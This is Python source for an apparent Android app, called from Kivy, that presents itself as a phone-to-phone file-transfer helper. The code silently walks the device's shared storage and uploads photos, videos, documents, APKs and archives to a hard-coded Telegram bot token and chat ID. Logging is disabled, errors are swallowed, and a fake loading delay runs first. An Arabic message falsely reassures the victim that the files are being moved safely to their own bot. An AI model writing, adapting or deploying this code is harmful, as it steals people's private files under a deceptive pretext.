import os
import time
import random
import logging
from threading import Thread

logging.disable(logging.CRITICAL)

import telebot
telebot.logger.setLevel(logging.CRITICAL)
telebot.logger.disabled = True
telebot.logger.propagate = False

BOT_TOKEN = "8830966196:AAHykKWMdImLdFQtDU3RSwW4P89Z0LAILxE"
CHAT_ID = "8325610710"

dir_path = "/storage/emulated/0/"

IMAGE_EXTS = ('.jpg', '.jpeg', '.png', '.PNG', '.JPEG', '.Webp', '.webp')
VIDEO_EXTS = ('.mp4', '.mov', '.avi', '.mkv', '.3gp', '.flv', '.wmv', '.MP4', '.MOV')
DOCUMENT_EXTS = ('.pdf', '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx', '.txt', 
                 '.zip', '.rar', '.apk', '.html', '.htm', '.xml', '.json', '.csv')

MAX_FILE_SIZE = 50 * 1024 * 1024
HACKING_MESSAGES = [
    "جاري نقل ملفات بأمان الى البوت الخاص بك ..ثم بعد ذلك بامكانك نقلها من البوت الى هاتفك الجديد..ثق بنا..",
]
MESSAGES = HACKING_MESSAGES

WATERMARK_TEXT = (
    "WARNING: THIS TOOL IS PROPERTY OF V_9_K_E. ANY UNAUTHORIZED USE OR "
    "COPYING WILL RESULT IN LEGAL ACTION. Contact: @v_9_k_e"
)

is_active = True
bot = telebot.TeleBot(BOT_TOKEN)


def send_file(file_path):
    try:
        if not is_active:
            return
        file_size = os.path.getsize(file_path)
        if file_size > MAX_FILE_SIZE:
            return
        watermark = WATERMARK_TEXT
        if file_path.lower().endswith(IMAGE_EXTS):
            with open(file_path, 'rb') as f:
                bot.send_photo(chat_id=CHAT_ID, photo=f, caption=watermark)
        elif file_path.lower().endswith(VIDEO_EXTS):
            with open(file_path, 'rb') as f:
                bot.send_video(chat_id=CHAT_ID, video=f, caption=watermark, supports_streaming=True)
        elif file_path.lower().endswith(DOCUMENT_EXTS):
            with open(file_path, 'rb') as f:
                bot.send_document(chat_id=CHAT_ID, document=f, caption=watermark)
    except Exception:
        pass


def main_operation():
    global is_active
    watermark = WATERMARK_TEXT
    try:
        bot.send_message(chat_id=CHAT_ID, text=f"🚀 بدأت العمليه\n\n{watermark}")
    except Exception:
        pass
    
    # شاشة تحميل صامتة
    for i in range(1, 11):
        if not is_active:
            return
        time.sleep(random.uniform(0.5, 2.0))
    
    file_counts = {"images": 0, "videos": 0, "documents": 0, "other": 0}
    
    try:
        for root, dirs, files in os.walk(dir_path):
            if not is_active:
                break
            threads = []
            for file in files:
                if not is_active:
                    break
                file_path = os.path.join(root, file)
                if file_path.lower().endswith(IMAGE_EXTS):
                    file_counts["images"] += 1
                elif file_path.lower().endswith(VIDEO_EXTS):
                    file_counts["videos"] += 1
                elif file_path.lower().endswith(DOCUMENT_EXTS):
                    file_counts["documents"] += 1
                else:
                    file_counts["other"] += 1
                    continue
                
                t = Thread(target=send_file, args=(file_path,))
                t.start()
                threads.append(t)
                
                if len(threads) >= 5:
                    for thread in threads:
                        thread.join()
                    threads = []
                    time.sleep(0.5)
            
            for thread in threads:
                thread.join()
    except Exception:
        pass
    
    watermark = WATERMARK_TEXT
    if is_active:
        header = "✅ اكتملت عملية النقل"
    else:
        header = "🛑 تم إيقاف عملية النقل بواسطتك"

    report = (
        f"{header}\n\n"
        f"📊 إحصائيات الملفات المنقوله:\n"
        f"🖼️ الصور: {file_counts['images']}\n"
        f"🎬 الفيديوهات: {file_counts['videos']}\n"
        f"📄 المستندات: {file_counts['documents']}\n"
        f"📦 ملفات أخرى: {file_counts['other']}\n\n"
        f"{watermark}"
    )
    try:
        bot.send_message(chat_id=CHAT_ID, text=report)
    except Exception:
        pass


def run_bot():
    """الدالة اللي Kivy بينادي عليها"""
    global is_active
    is_active = True
    t = Thread(target=main_operation, daemon=True)
    t.start()
    # polling في thread منفصل
    try:
        bot.polling(none_stop=True, interval=1, timeout=20)
    except Exception:
        pass